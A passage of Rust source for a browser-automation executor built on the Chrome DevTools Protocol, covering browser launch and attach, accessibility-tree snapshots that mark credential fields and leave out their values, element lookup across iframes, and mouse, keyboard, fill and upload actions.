use std::collections::HashMap;
use std::path::{Path, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::{Duration, Instant};

use chromiumoxide::browser::BrowserConfig;
use chromiumoxide::cdp::browser_protocol::accessibility::{AxNode, GetFullAxTreeParams};
use chromiumoxide::cdp::browser_protocol::dom::{
    BackendNodeId, DescribeNodeParams, FocusParams, GetContentQuadsParams, ResolveNodeParams,
    ScrollIntoViewIfNeededParams, SetFileInputFilesParams,
};
use chromiumoxide::cdp::browser_protocol::input::{
    DispatchKeyEventParams, DispatchKeyEventType, DispatchMouseEventParams, DispatchMouseEventType,
    InsertTextParams, MouseButton,
};
use chromiumoxide::cdp::browser_protocol::network::LoaderId;
use chromiumoxide::cdp::browser_protocol::page::{
    AddScriptToEvaluateOnNewDocumentParams, CreateIsolatedWorldParams, FrameId, FrameTree,
    GetFrameTreeParams, NavigateParams,
};
use chromiumoxide::cdp::browser_protocol::target::{CloseTargetParams, GetTargetsParams, TargetId};
use chromiumoxide::cdp::js_protocol::runtime::{
    AddBindingParams, CallArgument, CallFunctionOnParams, EvaluateParams, EventBindingCalled,
    ExecutionContextId, RemoteObjectId,
};
use chromiumoxide::error::CdpError;
use chromiumoxide::handler::HandlerConfig;
use chromiumoxide::{Browser, Page};
use futures::StreamExt;
use tokio::task::JoinHandle;

mod session;
mod wire;
pub use session::{cookie_param, domain_matches, host_of, OriginStorage, SessionState, Stopped};

pub const STEP_TIMEOUT: Duration = Duration::from_secs(15);
const POLL: Duration = Duration::from_millis(50);

pub type Res<T> = Result<T, Fault>;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Fault(pub &'static str, pub String);

impl Fault {
    pub fn new(cause: &'static str, detail: impl Into<String>) -> Self {
        Fault(cause, detail.into())
    }
}

fn cdp<E: std::fmt::Display>(cause: &'static str) -> impl FnOnce(E) -> Fault {
    move |e| Fault::new(cause, e.to_string())
}

pub struct StartOptions {
    pub browser: PathBuf,
    pub profile: PathBuf,
    pub headless: bool,
    pub flags: Vec<String>,
    pub debug_port: Option<u16>,
}

#[derive(Clone, Debug, PartialEq, Eq)]
enum Place {
    Page,
    Frame(String),
}

#[derive(Clone, Debug)]
struct Target {
    frame: FrameId,
    node: BackendNodeId,
    place: Place,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Outcome {
    Continued,
    Failed,
    Refused,
}

/// A request that the rule paused before it left: its method, origin and path, the id of the
/// frame that made it, whether the rule let it through, and how the browser took the answer.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct PausedRequest {
    pub method: String,
    pub origin: String,
    pub path: String,
    pub frame: String,
    pub let_through: bool,
    pub outcome: Outcome,
    pub body: Vec<u8>,
    pub body_complete: bool,
}

impl PausedRequest {
    pub fn body_holds(&self, needle: &[u8]) -> bool {
        !needle.is_empty() && self.body.windows(needle.len()).any(|w| w == needle)
    }
}

pub(crate) fn body_of(
    request: &chromiumoxide::cdp::browser_protocol::network::Request,
) -> (Vec<u8>, bool) {
    use base64::Engine;
    let mut body = Vec::new();
    let mut complete = true;
    for entry in request.post_data_entries.iter().flatten() {
        let decoded = entry.bytes.as_ref().and_then(|b| {
            let text: &str = b.as_ref();
            base64::engine::general_purpose::STANDARD.decode(text).ok()
        });
        match decoded {
            Some(bytes) => body.extend(bytes),
            None => complete = false,
        }
    }
    (body, complete)
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SnapshotLine {
    pub reference: String,
    pub role: &'static str,
    pub name: String,
    pub value: Option<String>,
    pub credential: bool,
    pub frame: Option<String>,
}

impl SnapshotLine {
    pub fn render(&self) -> String {
        let mut out = format!("{} {} \"{}\"", self.reference, self.role, quote(&self.name));
        if let Some(v) = &self.value {
            out.push_str(&format!(" value=\"{}\"", quote(v)));
        }
        if self.credential {
            out.push_str(" credential");
        }
        if let Some(f) = &self.frame {
            out.push_str(&format!(" frame={f}"));
        }
        out
    }
}

fn quote(s: &str) -> String {
    s.replace('"', "''")
}

#[derive(Clone, Debug)]
pub enum Locator {
    TestId(String),
    Role(&'static str, String),
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Resolved {
    One { reference: String, locator: usize },
    None,
    Many { locator: usize },
}

pub struct Executor {
    browser: Browser,
    page: Page,
    handler: JoinHandle<()>,
    pid: Option<u32>,
    refs: Vec<Target>,
    recorded: Arc<Mutex<Vec<String>>>,
    recorder: Option<JoinHandle<()>>,
    owns_process: bool,
    profile: Option<PathBuf>,
    temp: Option<PathBuf>,
    wire: wire::Wire,
    wire_task: JoinHandle<()>,
    places: Mutex<HashMap<String, Place>>,
    owners: Mutex<HashMap<String, (Place, BackendNodeId)>>,
}

fn start_failed(opts: &StartOptions, e: CdpError) -> Fault {
    let stderr = match &e {
        CdpError::LaunchExit(_, s) | CdpError::LaunchTimeout(s) | CdpError::LaunchIo(_, s) => {
            s.as_slice().to_vec()
        }
        other => other.to_string().into_bytes(),
    };
    let mut kept = opts.profile.clone().into_os_string();
    kept.push(".stderr");
    if let Ok(mut file) = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .open(&kept)
    {
        let _ = std::io::Write::write_all(&mut file, &stderr);
    }
    Fault::new(
        "browser_start",
        format!("stderr_kept_bytes_{}", stderr.len()),
    )
}

pub fn launch_args(opts: &StartOptions) -> Vec<String> {
    let mut args: Vec<String> = opts.flags.clone();
    if cfg!(target_os = "macos") {
        args.push("--use-mock-keychain".into());
    }
    args
}

impl Executor {
    pub async fn start(opts: &StartOptions) -> Res<Executor> {
        let (profile, temp) = session::make_dirs(&opts.profile)?;
        let made = session::RemoveOnDrop::new(&profile, &temp);
        match Executor::launch(opts, &temp).await {
            Ok(mut started) => {
                made.disarm();
                started.profile = Some(profile);
                started.temp = Some(temp);
                Ok(started)
            }
            Err(f) => {
                session::remove_dirs(&profile, &temp).await;
                made.disarm();
                Err(f)
            }
        }
    }

    async fn launch(opts: &StartOptions, temp: &Path) -> Res<Executor> {
        let temp_text = temp.to_string_lossy().into_owned();
        let mut builder = BrowserConfig::builder()
            .chrome_executable(&opts.browser)
            .disable_default_args()
            .user_data_dir(&opts.profile)
            .port(opts.debug_port.unwrap_or(0))
            .launch_timeout(Duration::from_secs(30))
            .request_timeout(STEP_TIMEOUT)
            .respect_https_errors();
        builder = if opts.headless {
            builder.new_headless_mode()
        } else {
            builder.with_head()
        };
        builder = if cfg!(windows) {
            builder.env("TMP", temp_text.clone()).env("TEMP", temp_text)
        } else {
            builder.env("TMPDIR", temp_text)
        };
        for flag in launch_args(opts) {
            let bare = flag.trim_start_matches('-');
            builder = match bare.split_once('=') {
                Some((k, v)) => builder.arg((k, v)),
                None => builder.arg(bare),
            };
        }
        let config = builder.build().map_err(|e| Fault::new("start", e))?;
        let (mut browser, mut handler) = Browser::launch(config)
            .await
            .map_err(|e| start_failed(opts, e))?;
        let pid = browser.get_mut_child().and_then(|c| c.inner.id());
        let handler = tokio::spawn(async move { while handler.next().await.is_some() {} });
        let address = browser.websocket_address().clone();
        let (wire, wire_task) = match wire::Wire::open(&address).await {
            Ok(w) => w,
            Err(f) => {
                let _ = browser.kill().await;
                handler.abort();
                return Err(Fault::new("start", f.1));
            }
        };
        let page = match browser.new_page("about:blank").await {
            Ok(p) => p,
            Err(e) => {
                wire_task.abort();
                let _ = browser.kill().await;
                return Err(Fault::new("start", e.to_string()));
            }
        };
        wire.set_home(page.target_id().inner());
        if let Err(f) = Executor::close_other_pages(&browser, &page).await {
            wire_task.abort();
            let _ = browser.kill().await;
            return Err(Fault::new("start", f.1));
        }
        Ok(Executor::wrap(
            browser,
            page,
            handler,
            pid,
            true,
            (wire, wire_task),
        ))
    }

    async fn close_other_pages(browser: &Browser, page: &Page) -> Res<()> {
        let r = browser
            .execute(GetTargetsParams::default())
            .await
            .map_err(cdp("start"))?;
        for t in r.result.target_infos {
            if t.r#type == "page" && &t.target_id != page.target_id() {
                browser
                    .execute(CloseTargetParams::new(t.target_id))
                    .await
                    .map_err(cdp("start"))?;
            }
        }
        Ok(())
    }

    pub async fn connect(address: &str, url_prefix: &str) -> Res<Executor> {
        let config = HandlerConfig {
            ignore_https_errors: false,
            ..HandlerConfig::default()
        };
        let (mut browser, mut handler) =
            Browser::connect_with_config(format!("http://{address}"), config)
                .await
                .map_err(cdp("attach"))?;
        let handler = tokio::spawn(async move { while handler.next().await.is_some() {} });
        let (wire, wire_task) = match wire::Wire::open(browser.websocket_address()).await {
            Ok(w) => w,
            Err(f) => {
                handler.abort();
                return Err(Fault::new("attach", f.1));
            }
        };
        match Executor::page_of(&mut browser, url_prefix).await {
            Ok(page) => {
                wire.set_home(page.target_id().inner());
                Ok(Executor::wrap(
                    browser,
                    page,
                    handler,
                    None,
                    false,
                    (wire, wire_task),
                ))
            }
            Err(f) => {
                wire_task.abort();
                handler.abort();
                Err(f)
            }
        }
    }

    async fn page_of(browser: &mut Browser, url_prefix: &str) -> Res<Page> {
        let targets = browser.fetch_targets().await.map_err(cdp("attach"))?;
        let pages: Vec<TargetId> = targets
            .into_iter()
            .filter(|t| t.r#type == "page" && t.url.starts_with(url_prefix))
            .map(|t| t.target_id)
            .collect();
        let target = match pages.as_slice() {
            [one] => one.clone(),
            [] => return Err(Fault::new("attach", "none")),
            _ => return Err(Fault::new("attach", "many")),
        };
        let deadline = Instant::now() + STEP_TIMEOUT;
        loop {
            match browser.get_page(target.clone()).await {
                Ok(p) => return Ok(p),
                Err(e) if Instant::now() > deadline => {
                    return Err(Fault::new("attach", e.to_string()))
                }
                Err(_) => tokio::time::sleep(POLL).await,
            }
        }
    }

    fn wrap(
        browser: Browser,
        page: Page,
        handler: JoinHandle<()>,
        pid: Option<u32>,
        owns_process: bool,
        wired: (wire::Wire, JoinHandle<()>),
    ) -> Executor {
        Executor {
            browser,
            page,
            handler,
            pid,
            refs: Vec::new(),
            recorded: Arc::new(Mutex::new(Vec::new())),
            recorder: None,
            owns_process,
            profile: None,
            temp: None,
            wire: wired.0,
            wire_task: wired.1,
            places: Mutex::new(HashMap::new()),
            owners: Mutex::new(HashMap::new()),
        }
    }

    pub fn pid(&self) -> Option<u32> {
        self.pid
    }

    pub async fn version(&self) -> Res<String> {
        let v = self.browser.version().await.map_err(cdp("version"))?;
        Ok(v.product)
    }

    /// The faults of the library's own connection, which attaches to every target of the browser
    /// before it runs: a target that it could not prepare is left waiting, and named here.
    pub fn attach_faults(&self) -> Vec<String> {
        self.wire.faults()
    }

    pub async fn stop(mut self) -> Vec<u32> {
        if let Some(t) = self.recorder.take() {
            t.abort();
        }
        if self.owns_process {
            let _ = tokio::time::timeout(Duration::from_secs(5), self.browser.close()).await;
            let exited = tokio::time::timeout(Duration::from_secs(10), self.browser.wait()).await;
            if !matches!(exited, Ok(Ok(Some(_)))) {
                let _ = self.browser.kill().await;
            }
        }
        self.wire_task.abort();
        self.handler.abort();
        self.pid.into_iter().collect()
    }

    async fn exec<C: chromiumoxide::types::Command>(
        &self,
        place: &Place,
        cause: &'static str,
        cmd: C,
    ) -> Res<C::Response> {
        match place {
            Place::Page => self
                .page
                .execute(cmd)
                .await
                .map(|r| r.result)
                .map_err(cdp(cause)),
            Place::Frame(session) => self
                .wire
                .call(Some(session), cmd)
                .await
                .map_err(|f| Fault::new(cause, f.1)),
        }
    }

    fn place_of(&self, frame: &FrameId) -> Place {
        if let Some((session, kind)) = self.wire.session_of(frame.inner()) {
            if kind == "iframe" {
                return Place::Frame(session);
            }
        }
        self.places
            .lock()
            .ok()
            .and_then(|p| p.get(frame.inner()).cloned())
            .unwrap_or(Place::Page)
    }

    fn enter_frame(&self, child: &FrameId, parent: &Place, owner: BackendNodeId) -> Place {
        let place = match self.wire.session_of(child.inner()) {
            Some((session, kind)) if kind == "iframe" => Place::Frame(session),
            _ => parent.clone(),
        };
        if let Place::Frame(session) = &place {
            if &place != parent {
                if let Ok(mut o) = self.owners.lock() {
                    o.insert(session.clone(), (parent.clone(), owner));
                }
            }
        }
        if let Ok(mut p) = self.places.lock() {
            p.insert(child.inner().clone(), place.clone());
        }
        place
    }

    /// Whether the frame runs as a target of its own, out of the process of the page that holds
    /// it, as the library's own connection sees it.
    pub fn runs_apart(&self, frame: &FrameId) -> bool {
        matches!(self.place_of(frame), Place::Frame(_))
    }

    async fn frame_tree(&self) -> Res<FrameTree> {
        self.frame_tree_at(&Place::Page).await
    }

    async fn frame_tree_at(&self, place: &Place) -> Res<FrameTree> {
        let r = self
            .exec(place, "frame", GetFrameTreeParams::default())
            .await?;
        Ok(r.frame_tree)
    }

    pub async fn main_frame(&self) -> Res<FrameId> {
        Ok(self.frame_tree().await?.frame.id)
    }

    async fn frame_info(&self, frame: &FrameId) -> Res<(LoaderId, String, String)> {
        fn find(t: &FrameTree, id: &FrameId) -> Option<(LoaderId, String, String)> {
            if &t.frame.id == id {
                return Some((
                    t.frame.loader_id.clone(),
                    t.frame.url.clone(),
                    t.frame.security_origin.clone(),
                ));
            }
            t.child_frames.iter().flatten().find_map(|c| find(c, id))
        }
        let tree = self.frame_tree_at(&self.place_of(frame)).await?;
        find(&tree, frame).ok_or_else(|| Fault::new("frame", "frame is gone"))
    }

    pub async fn frame_url(&self, frame: &FrameId) -> Res<String> {
        Ok(self.frame_info(frame).await?.1)
    }

    pub async fn frame_origin(&self, frame: &FrameId) -> Res<String> {
        Ok(self.frame_info(frame).await?.2)
    }

    async fn world(&self, frame: &FrameId) -> Res<ExecutionContextId> {
        let r = self
            .exec(
                &self.place_of(frame),
                "frame",
                CreateIsolatedWorldParams::new(frame.clone()),
            )
            .await?;
        Ok(r.execution_context_id)
    }

    async fn eval_value(&self, frame: &FrameId, expression: &str) -> Res<serde_json::Value> {
        let ctx = self.world(frame).await?;
        let params = EvaluateParams::builder()
            .expression(expression)
            .context_id(ctx)
            .return_by_value(true)
            .build()
            .map_err(|e| Fault::new("eval", e))?;
        let r = self.exec(&self.place_of(frame), "eval", params).await?;
        if r.exception_details.is_some() {
            return Err(Fault::new("eval", "exception"));
        }
        Ok(r.result.value.unwrap_or(serde_json::Value::Null))
    }

    async fn ready(&self, frame: &FrameId) -> bool {
        matches!(
            self.eval_value(frame, "document.readyState").await,
            Ok(serde_json::Value::String(s)) if s == "complete"
        )
    }

    pub async fn loader(&self, frame: &FrameId) -> Res<LoaderId> {
        Ok(self.frame_info(frame).await?.0)
    }

    pub async fn wait_loaded_after(&self, frame: &FrameId, before: Option<&LoaderId>) -> Res<()> {
        let deadline = Instant::now() + STEP_TIMEOUT;
        loop {
            if let Ok((loader, _, _)) = self.frame_info(frame).await {
                if before != Some(&loader) && self.ready(frame).await {
                    return Ok(());
                }
            }
            if Instant::now() > deadline {
                return Err(Fault::new("timeout", "load"));
            }
            tokio::time::sleep(POLL).await;
        }
    }

    pub async fn open(&mut self, url: &str) -> Res<()> {
        let frame = self.main_frame().await?;
        let before = self.loader(&frame).await?;
        let r = self
            .page
            .execute(NavigateParams::new(url))
            .await
            .map_err(cdp("navigate"))?;
        if let Some(err) = r.result.error_text {
            return Err(Fault::new("navigate", err));
        }
        self.refs.clear();
        self.wait_loaded_after(&frame, Some(&before)).await
    }

    pub async fn navigate_error(&self, url: &str) -> Res<Option<String>> {
        let r = self
            .page
            .execute(NavigateParams::new(url))
            .await
            .map_err(cdp("navigate"))?;
        Ok(r.result.error_text)
    }

    async fn ax_tree(&self, frame: &FrameId) -> Res<Vec<AxNode>> {
        let r = self
            .exec(
                &self.place_of(frame),
                "snapshot",
                GetFullAxTreeParams::builder()
                    .frame_id(frame.clone())
                    .build(),
            )
            .await?;
        Ok(r.nodes)
    }

    async fn object_of(&self, place: &Place, node: &BackendNodeId) -> Res<RemoteObjectId> {
        let r = self
            .exec(
                place,
                "node",
                ResolveNodeParams::builder().backend_node_id(*node).build(),
            )
            .await?;
        r.object
            .object_id
            .ok_or_else(|| Fault::new("node", "no object"))
    }

    async fn call_on(
        &self,
        place: &Place,
        node: &BackendNodeId,
        function: &str,
        args: Vec<serde_json::Value>,
    ) -> Res<serde_json::Value> {
        let object = self.object_of(place, node).await?;
        let mut builder = CallFunctionOnParams::builder()
            .function_declaration(function)
            .object_id(object)
            .return_by_value(true);
        for a in args {
            builder = builder.argument(CallArgument::builder().value(a).build());
        }
        let params = builder.build().map_err(|e| Fault::new("call", e))?;
        let r = self.exec(place, "call", params).await?;
        if r.exception_details.is_some() {
            return Err(Fault::new("call", "exception"));
        }
        Ok(r.result.value.unwrap_or(serde_json::Value::Null))
    }

    async fn is_credential(&self, place: &Place, node: &BackendNodeId) -> Res<bool> {
        let v = self.call_on(place, node, CREDENTIAL_FN, Vec::new()).await?;
        Ok(v == serde_json::Value::Bool(true))
    }

    async fn child_frame_of(&self, place: &Place, owner: &BackendNodeId) -> Res<FrameId> {
        let r = self
            .exec(
                place,
                "frame",
                DescribeNodeParams::builder()
                    .backend_node_id(*owner)
                    .build(),
            )
            .await?;
        r.node
            .frame_id
            .ok_or_else(|| Fault::new("frame", "owner has no frame"))
    }

    pub async fn snapshot(&mut self) -> Res<Vec<SnapshotLine>> {
        self.refs.clear();
        let main = self.main_frame().await?;
        let mut lines = Vec::new();
        self.snapshot_frame(&main, None, &mut lines).await?;
        Ok(lines)
    }

    pub async fn table(&mut self, name: &str) -> Res<Vec<SnapshotLine>> {
        let main = self.main_frame().await?;
        let nodes = self.ax_tree(&main).await?;
        let tables: Vec<usize> = nodes
            .iter()
            .enumerate()
            .filter(|(_, n)| !n.ignored)
            .filter(|(_, n)| matches!(ax_text(&n.role).as_str(), "table" | "grid"))
            .filter(|(_, n)| squeeze(&ax_text(&n.name)) == name)
            .map(|(i, _)| i)
            .collect();
        let root = match tables.as_slice() {
            [one] => *one,
            [] => return Err(Fault::new("resolve", "none")),
            _ => return Err(Fault::new("resolve", "many")),
        };
        let mut lines = Vec::new();
        self.lines_under(&main, &nodes, root, None, &mut lines)
            .await?;
        Ok(lines)
    }

    fn add_ref(&mut self, target: Target) -> String {
        self.refs.push(target);
        format!("e{}", self.refs.len())
    }

    async fn snapshot_frame(
        &mut self,
        frame: &FrameId,
        label: Option<String>,
        lines: &mut Vec<SnapshotLine>,
    ) -> Res<()> {
        let nodes = self.ax_tree(frame).await?;
        let root = nodes
            .iter()
            .position(|n| n.parent_id.is_none())
            .ok_or_else(|| Fault::new("snapshot", "no root"))?;
        self.lines_under(frame, &nodes, root, label, lines).await
    }

    async fn lines_under(
        &mut self,
        frame: &FrameId,
        nodes: &[AxNode],
        root: usize,
        label: Option<String>,
        lines: &mut Vec<SnapshotLine>,
    ) -> Res<()> {
        let place = self.place_of(frame);
        let index: HashMap<String, usize> = nodes
            .iter()
            .enumerate()
            .map(|(i, n)| (n.node_id.inner().clone(), i))
            .collect();
        let mut stack: Vec<(usize, bool)> = vec![(root, false)];
        while let Some((i, inside)) = stack.pop() {
            let node = &nodes[i];
            let children: Vec<usize> = node
                .child_ids
                .iter()
                .flatten()
                .filter_map(|c| index.get(c.inner()).copied())
                .collect();
            let push_children = |stack: &mut Vec<(usize, bool)>, inside: bool| {
                for c in children.iter().rev() {
                    stack.push((*c, inside));
                }
            };
            if node.ignored {
                push_children(&mut stack, inside);
                continue;
            }
            let role = map_role(&ax_text(&node.role));
            let name = squeeze(&ax_text(&node.name));
            match role {
                None => push_children(&mut stack, inside),
                Some("text") => {
                    if !inside && !name.is_empty() {
                        if let Some(b) = node.backend_dom_node_id {
                            let r = self.add_ref(Target {
                                frame: frame.clone(),
                                node: b,
                                place: place.clone(),
                            });
                            lines.push(SnapshotLine {
                                reference: r,
                                role: "text",
                                name,
                                value: None,
                                credential: false,
                                frame: label.clone(),
                            });
                        }
                    }
                }
                Some(role) => {
                    let Some(b) = node.backend_dom_node_id else {
                        push_children(&mut stack, true);
                        continue;
                    };
                    let credential = if CONTROL_ROLES.contains(&role) {
                        self.is_credential(&place, &b).await?
                    } else {
                        false
                    };
                    let raw = ax_text(&node.value).replace(['\r', '\n', '\t'], " ");
                    let value = if credential || !VALUE_ROLES.contains(&role) || raw.is_empty() {
                        None
                    } else {
                        Some(raw)
                    };
                    let r = self.add_ref(Target {
                        frame: frame.clone(),
                        node: b,
                        place: place.clone(),
                    });
                    lines.push(SnapshotLine {
                        reference: r,
                        role,
                        name,
                        value,
                        credential,
                        frame: label.clone(),
                    });
                    if role == "frame" {
                        let child = self.child_frame_of(&place, &b).await?;
                        self.enter_frame(&child, &place, b);
                        let origin = self.frame_origin(&child).await?;
                        Box::pin(self.snapshot_frame(&child, Some(origin), lines)).await?;
                    } else {
                        push_children(&mut stack, true);
                    }
                }
            }
        }
        Ok(())
    }

    async fn frame_by_path(&self, path: &[&str]) -> Res<Result<FrameId, Resolved>> {
        let mut frame = self.main_frame().await?;
        for (i, name) in path.iter().enumerate() {
            let place = self.place_of(&frame);
            let owners: Vec<BackendNodeId> = self
                .ax_tree(&frame)
                .await?
                .iter()
                .filter(|n| !n.ignored)
                .filter(|n| map_role(&ax_text(&n.role)) == Some("frame"))
                .filter(|n| squeeze(&ax_text(&n.name)) == *name)
                .filter_map(|n| n.backend_dom_node_id)
                .collect();
            match owners.len() {
                0 => return Ok(Err(Resolved::None)),
                1 => {}
                _ => return Ok(Err(Resolved::Many { locator: i })),
            }
            frame = self.child_frame_of(&place, &owners[0]).await?;
            self.enter_frame(&frame, &place, owners[0]);
            if !self.ready(&frame).await {
                return Ok(Err(Resolved::None));
            }
        }
        Ok(Ok(frame))
    }

    async fn by_test_id(&self, frame: &FrameId, id: &str) -> Res<Vec<BackendNodeId>> {
        let place = self.place_of(frame);
        let ctx = self.world(frame).await?;
        let selector = format!("[data-testid=\"{}\"]", id.replace('"', "\\\""));
        let count_expr = format!(
            "document.querySelectorAll({}).length",
            serde_json::Value::String(selector.clone())
        );
        let count = self
            .eval_value(frame, &count_expr)
            .await?
            .as_u64()
            .unwrap_or(0);
        if count != 1 {
            return Ok(vec![BackendNodeId::new(0); count as usize]);
        }
        let params = EvaluateParams::builder()
            .expression(format!(
                "document.querySelector({})",
                serde_json::Value::String(selector)
            ))
            .context_id(ctx)
            .build()
            .map_err(|e| Fault::new("eval", e))?;
        let r = self.exec(&place, "eval", params).await?;
        let object = r
            .result
            .object_id
            .ok_or_else(|| Fault::new("eval", "no element"))?;
        let d = self
            .exec(
                &place,
                "node",
                DescribeNodeParams::builder().object_id(object).build(),
            )
            .await?;
        Ok(vec![d.node.backend_node_id])
    }

    async fn by_role(&self, frame: &FrameId, role: &str, name: &str) -> Res<Vec<BackendNodeId>> {
        Ok(self
            .ax_tree(frame)
            .await?
            .iter()
            .filter(|n| !n.ignored)
            .filter(|n| map_role(&ax_text(&n.role)) == Some(role))
            .filter(|n| squeeze(&ax_text(&n.name)) == name)
            .filter_map(|n| n.backend_dom_node_id)
            .collect())
    }

    pub async fn resolve(&mut self, locators: &[Locator], frame_path: &[&str]) -> Res<Resolved> {
        let frame = match self.frame_by_path(frame_path).await? {
            Ok(frame) => frame,
            Err(unresolved) => return Ok(unresolved),
        };
        let place = self.place_of(&frame);
        for (i, locator) in locators.iter().enumerate() {
            let found = match locator {
                Locator::TestId(id) => self.by_test_id(&frame, id).await?,
                Locator::Role(role, name) => self.by_role(&frame, role, name).await?,
            };
            match found.len() {
                0 => continue,
                1 => {
                    let reference = self.add_ref(Target {
                        frame: frame.clone(),
                        node: found[0],
                        place: place.clone(),
                    });
                    return Ok(Resolved::One {
                        reference,
                        locator: i,
                    });
                }
                _ => return Ok(Resolved::Many { locator: i }),
            }
        }
        Ok(Resolved::None)
    }

    pub async fn resolve_one(&mut self, locators: &[Locator], frame_path: &[&str]) -> Res<String> {
        match self.resolve(locators, frame_path).await? {
            Resolved::One { reference, .. } => Ok(reference),
            Resolved::None => Err(Fault::new("resolve", "none")),
            Resolved::Many { .. } => Err(Fault::new("resolve", "many")),
        }
    }

    fn target(&self, reference: &str) -> Res<Target> {
        reference
            .strip_prefix('e')
            .and_then(|n| n.parse::<usize>().ok())
            .and_then(|n| n.checked_sub(1))
            .and_then(|n| self.refs.get(n))
            .cloned()
            .ok_or_else(|| Fault::new("ref", reference.to_string()))
    }

    pub async fn frame_of(&self, reference: &str) -> Res<FrameId> {
        Ok(self.target(reference)?.frame)
    }

    async fn offset_of(&self, place: &Place) -> Res<(f64, f64)> {
        let mut x = 0.0;
        let mut y = 0.0;
        let mut here = place.clone();
        for _ in 0..MAX_FRAME_DEPTH {
            let Place::Frame(session) = &here else {
                return Ok((x, y));
            };
            let (parent, owner) = self
                .owners
                .lock()
                .ok()
                .and_then(|o| o.get(session).cloned())
                .ok_or_else(|| Fault::new("click", "frame owner"))?;
            let corner = self
                .call_on(&parent, &owner, CONTENT_CORNER_FN, Vec::new())
                .await?;
            let at = |i: usize| corner.get(i).and_then(|v| v.as_f64());
            let (Some(dx), Some(dy)) = (at(0), at(1)) else {
                return Err(Fault::new("click", "frame corner"));
            };
            x += dx;
            y += dy;
            here = parent;
        }
        Err(Fault::new("click", "frame depth"))
    }

    /// Clicks the ref with the mouse at the centre of its box. In a frame that runs in a process
    /// of its own, it first scrolls each frame that holds it into view, from the page down, and
    /// waits for two animation frames of the frame, and it then reads a mark that a click
    /// listener on the ref set: when the mark says that the click did not arrive, it clicks again,
    /// at most three times in all, and when the mark cannot be read because the document went
    /// away, the click counts as arrived.
    pub async fn click(&self, reference: &str) -> Res<()> {
        let t = self.target(reference)?;
        if t.place == Place::Page {
            return self.click_at(&t).await;
        }
        for _ in 0..FRAME_CLICK_TRIES {
            self.reveal(&t.place).await?;
            self.painted(&t.place).await?;
            self.call_on(&t.place, &t.node, MARK_CLICK_FN, Vec::new())
                .await?;
            self.click_at(&t).await?;
            match self
                .call_on(&t.place, &t.node, READ_CLICK_FN, Vec::new())
                .await
            {
                Ok(serde_json::Value::Bool(false)) => continue,
                _ => return Ok(()),
            }
        }
        Err(Fault::new("click", "not received"))
    }

    async fn reveal(&self, place: &Place) -> Res<()> {
        let mut chain: Vec<(Place, BackendNodeId)> = Vec::new();
        let mut here = place.clone();
        for _ in 0..MAX_FRAME_DEPTH {
            let Place::Frame(session) = &here else {
                break;
            };
            let (parent, owner) = self
                .owners
                .lock()
                .ok()
                .and_then(|o| o.get(session).cloned())
                .ok_or_else(|| Fault::new("click", "frame owner"))?;
            chain.push((parent.clone(), owner));
            here = parent;
        }
        for (parent, owner) in chain.iter().rev() {
            self.exec(
                parent,
                "click",
                ScrollIntoViewIfNeededParams::builder()
                    .backend_node_id(*owner)
                    .build(),
            )
            .await?;
        }
        Ok(())
    }

    async fn painted(&self, place: &Place) -> Res<()> {
        let params = EvaluateParams::builder()
            .expression(PAINTED_JS)
            .await_promise(true)
            .return_by_value(true)
            .build()
            .map_err(|e| Fault::new("click", e))?;
        self.exec(place, "click", params).await?;
        Ok(())
    }

    async fn click_at(&self, t: &Target) -> Res<()> {
        self.exec(
            &t.place,
            "click",
            ScrollIntoViewIfNeededParams::builder()
                .backend_node_id(t.node)
                .build(),
        )
        .await?;
        let quads = self
            .exec(
                &t.place,
                "click",
                GetContentQuadsParams::builder()
                    .backend_node_id(t.node)
                    .build(),
            )
            .await?;
        let q = quads
            .quads
            .first()
            .map(|q| q.inner().clone())
            .filter(|q| q.len() == 8)
            .ok_or_else(|| Fault::new("click", "no box"))?;
        let (dx, dy) = self.offset_of(&t.place).await?;
        let x = (q[0] + q[2] + q[4] + q[6]) / 4.0 + dx;
        let y = (q[1] + q[3] + q[5] + q[7]) / 4.0 + dy;
        for kind in [
            DispatchMouseEventType::MouseMoved,
            DispatchMouseEventType::MousePressed,
            DispatchMouseEventType::MouseReleased,
        ] {
            let mut b = DispatchMouseEventParams::builder()
                .r#type(kind.clone())
                .x(x)
                .y(y);
            if kind != DispatchMouseEventType::MouseMoved {
                b = b.button(MouseButton::Left).click_count(1);
            }
            let params = b.build().map_err(|e| Fault::new("click", e))?;
            self.page.execute(params).await.map_err(cdp("click"))?;
        }
        Ok(())
    }

    async fn focus(&self, t: &Target) -> Res<()> {
        self.exec(
            &t.place,
            "focus",
            FocusParams::builder().backend_node_id(t.node).build(),
        )
        .await?;
        Ok(())
    }

    pub async fn fill(&self, reference: &str, text: &str) -> Res<()> {
        let t = self.target(reference)?;
        self.focus(&t).await?;
        self.call_on(
            &t.place,
            &t.node,
            "function () { if (this.select) this.select(); }",
            Vec::new(),
        )
        .await?;
        self.exec(&t.place, "fill", InsertTextParams::new(text))
            .await?;
        Ok(())
    }

    pub async fn select(&self, reference: &str, label: &str) -> Res<()> {
        let t = self.target(reference)?;
        let v = self
            .call_on(
                &t.place,
                &t.node,
                SELECT_FN,
                vec![serde_json::Value::String(label.into())],
            )
            .await?;
        if v != serde_json::Value::Bool(true) {
            return Err(Fault::new("select", "no such option"));
        }
        Ok(())
    }

    pub async fn press(&self, reference: &str, key: &str) -> Res<()> {
        let t = self.target(reference)?;
        self.focus(&t).await?;
        let (code, text) = match key {
            "Enter" => (13, "\r"),
            "Tab" => (9, ""),
            "Escape" => (27, ""),
            _ => return Err(Fault::new("press", "key")),
        };
        for kind in [DispatchKeyEventType::KeyDown, DispatchKeyEventType::KeyUp] {
            let mut b = DispatchKeyEventParams::builder()
                .r#type(kind.clone())
                .key(key)
                .code(key)
                .windows_virtual_key_code(code);
            if kind == DispatchKeyEventType::KeyDown && !text.is_empty() {
                b = b.text(text);
            }
            let params = b.build().map_err(|e| Fault::new("press", e))?;
            self.exec(&t.place, "press", params).await?;
        }
        Ok(())
    }

    pub async fn upload(&self, reference: &str, file: &Path) -> Res<()> {
        let t = self.target(reference)?;
        self.exec(
            &t.place,
            "upload",
            SetFileInputFilesParams::builder()
                .file(file.display().to_string())
                .backend_node_id(t.node)
                .build()
                .map_err(|e| Fault::new("upload", e))?,
        )
        .await?;
        Ok(())
    }

